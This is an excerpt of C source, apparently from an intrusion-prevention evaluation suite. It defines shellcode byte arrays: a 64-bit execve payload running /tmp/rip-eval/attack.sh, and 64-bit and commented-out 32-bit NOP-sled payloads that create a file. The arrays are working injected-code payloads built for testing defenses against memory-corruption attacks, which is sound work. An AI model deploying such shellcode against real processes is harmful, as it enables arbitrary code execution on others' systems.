 ...
 * @author Aleph One
 * @author Colton Holoday (ported)
 */
static char shellcode_nonop[] = 
"\xEB\x22\x5F\x48\x31\xC0\x88\x47\x17\x48\x89\x47\x18\x48\x89\x47"
"\x20\xB0\x3B\x48\x8D\x77\x18\x48\x8D\x57\x20\x0F\x05\xB0\x3C\x48"
"\x31\xFF\x0F\x05\xE8\xD9\xFF\xFF\xFF/tmp/rip-eval/attack.sh";

/**
 * cjh: 64 bit nonop shellcode in assembly form
 *
 * shellcode:
 *     jmp filename
 * setup_complete:
...
"/tmp/rip-eval/attack.sh";
...
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xEB\x1C\x5F\x48\x31\xC0\x88\x47\x14\xB0\x55\x48\x31\xF6\x66\xBE"
"\xBC\x02\x0F\x05\x48\x31\xC0\xB0\x3C\x48\x31\xFF\x0F\x05\xE8\xDF"
"\xFF\xFF\xFF/tmp/rip-eval/f_xxxx";

/* 32 bit creatfile shellcode
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
    "\xEB\x18\x5B\x31\xC0\x88\x43\x14\xB0\x08\x31\xC9\x66\xB9\xBC\x02"
    "\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD\x80\xE8\xE3\xFF\xFF\xFF/tmp/rip-eval/f_xxxx";
*/
